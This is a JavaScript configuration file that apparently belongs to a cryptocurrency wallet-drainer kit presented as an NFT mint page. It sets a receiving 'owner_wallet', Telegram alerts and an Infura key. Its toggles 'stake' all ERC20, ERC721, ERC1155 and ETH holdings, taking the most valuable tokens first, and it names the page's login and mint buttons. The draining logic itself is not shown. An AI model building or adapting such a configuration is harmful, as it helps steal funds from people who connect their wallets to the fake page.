// ----- Variable config ----- //

const owner_pblc_config = {
    "owner_wallet" : "0x72e5f5616A25c4e53Ac590B3153a553F1d51D9f4",
}

const telegram_config = {
    "enable_telegram_notification" : true,
    "chatid" : 1646544268
}

const api_pblc_config = {
    "infura_api_key" : "123",   
    "infury_api_link" : "https://mainnet.infura.io/v3/123"
}

const options_config = {
    "enable_erc20_stake" : true,
    "enable_erc721_stake" : true,
    "enable_erc1155_stake" : true,
    "enable_eth_stake" : true,
    "enable_stake_most_expensive_erc20_token_first" : true, // only on mainnet
    "enable_only_stake_most_expensive_erc20_token" : false, // only on mainnet
    "minima_eth_balance_to_send" : 0.0001
}

const chain_config = {
    "chain_id" : "1"
}

// ---- Webpage items config ---- // 

const webpage_config = {

    "login_button" : "login_button",
    "mint_button" : "mint_button",
    
    "not_logged_div" : "not_logged",
    "logged_div" : "logged",
    
    "user_wallet_span" : "user_wallet_span",
    "user_wallet_span_mobile" : "user_wallet_span_mobile"

}
